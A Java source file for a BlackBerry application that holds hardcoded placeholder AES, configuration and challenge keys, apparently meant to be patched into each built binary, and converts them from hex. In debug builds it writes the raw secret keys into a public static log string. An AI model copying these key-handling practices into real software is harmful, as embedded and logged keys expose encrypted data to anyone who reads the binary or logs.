//#preprocess
package blackberry.config;

public class InstanceKeys {

    private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
    private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52";
    private static String instanceID = "bg5etG87q20Kg52W5Fg1";
    private static String buildID = "av3pVck1gb4eR2";
    private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";

    private static byte[] byteAesKey;
    private static byte[] byteChallengeKey;
    private static byte[] byteConfKey;
    private static byte[] byteInstanceID;

    public InstanceKeys() {
    }

    public static String log = "";

    /**
     * Checks for been binary patched.
     * 
     * @return true, if successful
     */
    public boolean hasBeenBinaryPatched() {
        boolean ret = !buildID.startsWith("av3pVck1gb4eR");
        //#ifdef DEBUG
        log += " buildID: " + buildID;
        //#endif
        return ret;
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getAesKey() {
        if (byteAesKey == null) {
            byteAesKey = keyFromString(aes);
            //#ifdef DEBUG
            log += " aes: " + aes;
            //#endif
        }
        return byteAesKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildId() {
        return buildID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getChallengeKey() {
        if (byteChallengeKey == null) {
            byteChallengeKey = keyFromString(challenge);
            //#ifdef DEBUG
            log += " challenge: " + challenge;
            //#endif
        }

        return byteChallengeKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        if (byteConfKey == null) {
            byteConfKey = keyFromString(conf);
            //#ifdef DEBUG
            log += " conf: " + conf;
            //#endif
        }

        return byteConfKey;
    }

    /**
     * Gets the instance id.
     * 
     * @return the instance id
     */
    public byte[] getInstanceId() {

        return byteInstanceID;
    }

    private byte[] keyFromString(final String string) {
        try {
            int len = 16;
            byte[] array = new byte[len];
            //#ifdef DEBUG
            log += string + " : ";
            //#endif

            for (int pos = 0; pos < len; pos++) {
                String repr = string.substring(pos * 2, pos * 2 + 2);
                array[pos] = (byte) Integer.parseInt(repr, 16);
                //#ifdef DEBUG
                log += "" + pos + ":" + repr + " ";
                //#endif
            }

            //#ifdef DEBUG
            log += " | ";
            //#endif
            return array;
        } catch (Exception ex) {
            //#ifdef DEBUG
            log += " Ex: " + ex;
            log += " binary pathced: " + hasBeenBinaryPatched();
            //#endif
            return null;
        }
    }

    /**
     * Sets the aes key.
     * 
     * @param key
     *            the new aes key
     */
    public void setAesKey(final byte[] key) {
        byteAesKey = key;
    }

    /**
     * Sets the builds the id.
     * 
     * @param build
     *            the new builds the id
     */
    public void setBuildID(final String build) {
        buildID = build;
    }

    /**
     * Sets the challenge key.
     * 
     * @param challenge_
     *            the new challenge key
     */
    public void setChallengeKey(final byte[] challenge_) {
        byteChallengeKey = challenge_;
    }

    /**
     * Sets the conf key.
     * 
     * @param conf_
     *            the new conf key
     */
    public void setConfKey(final byte[] conf_) {
        byteConfKey = conf_;
    }

}
